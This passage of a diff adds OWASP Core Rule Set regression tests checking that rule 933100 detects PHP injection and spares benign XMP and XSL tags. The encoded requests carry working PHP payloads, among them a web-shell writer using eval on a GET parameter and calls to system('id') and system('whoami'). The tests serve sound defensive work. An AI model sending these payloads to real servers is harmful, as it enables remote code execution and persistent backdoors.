+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/log?data=%3C%3Fphp%20%24f%3Dfopen%28%27shell.php%27%2C%27w%27%29%3B%20fwrite%28%24f%2C%27%3C%3Fphp%20eval%28%24_GET%5Bc%5D%29%3B%20%3F%3E%27%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 71
+    desc: |
+      PHP injection attack: <?php with array callback execution
+      decoded payload: <?php array_map("system",array("whoami")); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/api?callback=%3C%3Fphp%20array_map%28%22system%22%2Carray%28%22whoami%22%29%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 72
+    desc: |
+      Negative test: JavaScript ternary operator with PHP-like pattern
+      decoded payload: var x = (a < b) ? c : d; // <?test comment
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/js?code=var%20x%20%3D%20%28a%20%3C%20b%29%20%3F%20c%20%3A%20d%3B%20%2F%2F%20%3C%3Ftest%20comment"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 73
+    desc: |
+      Negative test: Email address with brackets
+      decoded payload: user@[192.168.1.1]
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/contact?email=user%40%5B192.168.1.1%5D"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 74
+    desc: |
+      PHP injection attack: <?pHp mixed case
+      decoded payload: <?pHp SyStEm('id'); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?x=%3C%3FpHp%20SyStEm%28%27id%27%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 75
+    desc: |
+      Negative test: XMP metadata tag (Extensible Metadata Platform)
+      Issue 4443: <?xpacket should not trigger false positive
+      decoded payload: <?xpacket begin="?" id="W5M0MpCehiHzreSzNTczkc9d"?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: POST
+          port: 80
+          uri: "/upload"
+          data: "metadata=%3C%3Fxpacket%20begin%3D%22%3F%22%20id%3D%22W5M0MpCehiHzreSzNTczkc9d%22%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 76
+    desc: |
+      Negative test: XMP metadata closing tag
+      Issue 4443: <?xpacket end="w"?> should not trigger false positive
+      decoded payload: <?xpacket end="w"?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: POST
+          port: 80
+          uri: "/upload"
+          data: "metadata=%3C%3Fxpacket%20end%3D%22w%22%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 77
+    desc: |
+      Negative test: Minimal XMP tag
+      Issue 4443: <?xpacket alone should not trigger
+      decoded payload: <?xpacket
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/test?tag=%3C%3Fxpacket"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 78
+    desc: |
+      Negative test: XMP tag with uppercase
+      Issue 4443: <?XPACKET should not trigger
+      decoded payload: <?XPACKET begin="?" id="test"?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: POST
+          port: 80
+          uri: "/api"
+          data: "xmp=%3C%3FXPACKET%20begin%3D%22%3F%22%20id%3D%22test%22%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 79
+    desc: |
+      Negative test: XMP metadata in typical PDF context
+      Issue 4443: Full XMP block as found in PDF files
+      decoded payload: <?xpacket begin="?" id="W5M0MpCehiHzreSzNTczkc9d"?><x:xmpmeta xmlns:x="adobe:ns:meta/">
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: POST
+          port: 80
+          uri: "/upload/pdf"
+          data: "content=%3C%3Fxpacket%20begin%3D%22%3F%22%20id%3D%22W5M0MpCehiHzreSzNTczkc9d%22%3F%3E%3Cx%3Axmpmeta%20xmlns%3Ax%3D%22adobe%3Ans%3Ameta%2F%22%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 80
+    desc: |
+      Negative test: XMP with mixed case (realistic)
+      Issue 4443: <?xPacket as might appear in some generators
+      decoded payload: <?xPacket begin="?" id="test"?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/meta?data=%3C%3FxPacket%20begin%3D%22%3F%22%20id%3D%22test%22%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 81
+    desc: |
+      Negative test: <?xphp is not a valid PHP tag
+      decoded payload: <?xphp system('id'); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?code=%3C%3Fxphp%20system%28%27id%27%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 82
+    desc: |
+      Negative test: <?xa is not a valid PHP tag
+      decoded payload: <?xa test
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/test?x=%3C%3Fxa%20test"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 83
+    desc: |
+      Negative test: <?xb is not a valid PHP tag
+      decoded payload: <?xb echo 1;
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?val=%3C%3Fxb%20echo%201%3B"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 84
+    desc: |
+      PHP injection attack: Polyglot with tab separator
+      decoded payload: <?xml	:echo 1;
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?x=%3C%3Fxml%09%3Aecho%201%3B"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 85
+    desc: |
+      PHP injection attack: Polyglot with newline separator
+      decoded payload: <?xml
+      :echo 1;
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?x=%3C%3Fxml%0A%3Aecho%201%3B"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 86
+    desc: |
+      PHP injection attack: Short tag without space (<?echo)
+      decoded payload: <?echo "test";?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?code=%3C%3Fecho%20%22test%22%3B%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 87
+    desc: |
+      PHP injection attack: Short tag with tab
+      decoded payload: <?	echo "test";?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?code=%3C%3F%09echo%20%22test%22%3B%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 88
+    desc: |
+      PHP injection attack: Short tag with newline
+      decoded payload: <?
+      system('id');?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?cmd=%3C%3F%0Asystem%28%27id%27%29%3B%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 89
+    desc: |
+      PHP injection in cookie name
+      decoded payload: Cookie: <?php phpinfo(); ?>=value
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+            Cookie: "<?php phpinfo(); ?>=value"
+          method: GET
+          port: 80
+          uri: "/profile"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 90
+    desc: |
+      Negative test: <?xsl-stylesheet should not trigger
+      decoded payload: <?xsl-stylesheet type="text/xsl" href="style.xsl"?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?data=%3C%3Fxsl-stylesheet%20type%3D%22text%2Fxsl%22%20href%3D%22style.xsl%22%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
